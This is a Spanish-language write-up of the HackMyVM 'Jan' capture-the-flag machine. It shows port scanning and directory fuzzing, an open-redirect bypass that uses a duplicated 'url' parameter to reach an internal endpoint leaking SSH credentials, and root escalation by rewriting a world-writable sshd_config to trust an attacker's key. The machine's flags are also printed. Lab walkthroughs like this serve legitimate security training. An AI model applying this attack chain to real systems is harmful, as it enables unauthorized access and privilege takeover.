---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Jan HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-02 02:38 EDT
Nmap scan report for 192.168.1.166
Host is up (0.00043s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Wed, 02 Apr 2025 06:38:43 GMT
|     Content-Length: 45
|     Content-Type: text/plain; charset=utf-8
|     Welcome to our Public Server. Maybe Internal.
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at 
https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=4/2%Time=67ECDB70%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Wed,\x2002\x20Apr\x20
SF:2025\x2006:38:43\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Ser
SF:ver\.\x20Maybe\x20Internal\.")%r(HTTPOptions,A2,"HTTP/1\.0\x20200\x20OK
SF:\r\nDate:\x20Wed,\x2002\x20Apr\x202025\x2006:38:43\x20GMT\r\nContent-Le
SF:ngth:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWel
SF:come\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(FourOhFourRequest,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Wed
SF:,\x2002\x20Apr\x202025\x2006:38:43\x20GMT\r\nContent-Length:\x2045\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20ou
SF:r\x20Public\x20Server\.\x20Maybe\x20Internal\.")%r(Socks5,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GenericLin
SF:es,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request");
MAC Address: 08:00:27:B2:3E:A1 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.83 seconds
```

Vemos que tenemos un puerto `8080` en el que contendra una pagina web, pero si entramos en el no veremos nada interesante, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>:8080/ -w <WORDLIST> -x html,php,txt -t 100 -k -r --exclude-length 45
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.166:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          45
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/redirect             (Status: 400) [Size: 24]
/robots.txt           (Status: 200) [Size: 16]
/robots.txt           (Status: 200) [Size: 16]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que nos saca cosas interesantes, vamos a ver que contiene el `robots.txt`, entrando dentro del fichero veremos lo siguiente:

```
/redirect
/credz
```

Vemos que tenemos `2` rutas, si probamos a entrar a `/credz` veremos que no nos pone esto:

```
Only accessible internally.
```

Pero si entramos en `/redirect` veremos que nos pone esto otro:

```
Parameter 'url' needed.
```

Por lo que esto puede que sea vulnerable a un `Open Redirect`, vamos a realizar lo siguiente para que nos redireccione hacia `/credz` desde la ruta de `/redirect`.

### Open Redirect (Vuln)

Si ponemos lo siguiente veremos esto:

```
URL = http://<IP>:8080/redirect?url=https://google.es
```

Info:

```
Only accessible internally.
```

Por lo que vemos de alguna manera lo esta bloqueando, por lo que tendremos que realizar algun `Bypass`, pero si le hacemos creer que es un `subdominio` con `@` tampoco funcionara, por lo que vamos añadirle un segundo parametro de `url` para ver si tambien verifica el segundo parametro el servidor.

```
URL = http://<IP>:8080/redirect?url=https://google.es&url=https://google.es
```

Aqui ya vemos que parece que funciona, ya que no muestra el mensaje anterior, por lo que vamos a probar si nos puede redirigir a `/credz` de la siguiente forma:

```
URL = http://<IP>:8080/redirect?url=https://google.es&url=/credz
```

Info:

```
ssh/EazyLOL
```

Vemos que ha funcionado, por lo que vamos a probar a conectarnos por `SSH` con las siguientes credenciales.

### SSH

```shell
ssh ssh@<IP>
```

Metemos como contraseña `EazyLOL` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMVSSWYMCNFIBDAFMTHFK
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User ssh may run the following commands on jan:
    (root) NOPASSWD: /sbin/service sshd restart
```

Vemos que podemos reiniciar el servicio de `SSH` como el usuario `root`, por lo que podremos hacer lo siguiente:

Vamos a ver que permisos tiene la configuracion de `SSH` el archivo:

```shell
ls -la /etc/ssh/sshd_config
```

Info:

```
-rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config
```

Vemos que podemos editar el archivo, por lo que haremos lo siguiente:

```shell
nano /etc/ssh/sshd_config

#Dentro del nano
PermitRootLogin yes #Vamos a poner esto a "yes"
PasswordAuthentication no #Vamos a desmarcar esto eliminando el "#" y le ponemos "no"
StrictModes no #Vamos a desmarcar esto eliminando el "#" y le ponemos "no"
PubkeyAuthentication yes #Vamos a desmarcar esto eliminando el "#"
AuthorizedKeysFile /home/ssh/.ssh/my_key.pub #Cambiamos a la ruta absoluta de nuestra clave publica para que la pille "root"
```

Ahora vamos a generar una clave `PEM`.

```shell
ssh-keygen -t rsa -f ~/my_key -N ""
```

Info:

```
Generating public/private rsa key pair.
Your identification has been saved in /home/ssh/my_key
Your public key has been saved in /home/ssh/my_key.pub
The key fingerprint is:
SHA256:4f93uqPKoCIVtSDUR2AQPEkryrX4TZ7OuV4m2Wy+LPc ssh@jan
The key's randomart image is:
+---[RSA 3072]----+
| +==oo.          |
|  =oo o          |
|. .+ + ..        |
|o.o o .. .       |
|.o . o  S        |
|  . = =  .       |
|   o * *. .      |
|  . +.Oo o .  o .|
|   ..B=+oEo.ooo= |
+----[SHA256]-----+
```

Echo esto, vamos a crear la carpeta `.ssh` y vamos a mover dichas claves a dicha carpeta.

```shell
mkdir ~/.ssh
mv ~/my_key* ~/.ssh
```

Ahora vamos a copiarnos el archivo `my_key` (`Clave Privada`) y pasarnoslo a nuestro `host`:

```shell
nano my_key

#Dentro del nano
<CLAVE_PRIVADA>
```

Lo guardamos y le ponemos los permisos correspondientes:

```shell
chmod 600 my_key
```

Ahora nos conectaremos por `SSH` con el usuario `root`.

```shell
ssh -i my_key root@<IP>
```

Info:

```
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~# whoami
root
```

Y con esto veremos que ha funcionado, por lo que leeremos la `flag` de `root`.

> root.txt

```
HMV2PRMTERWTFUDNGMBG
```
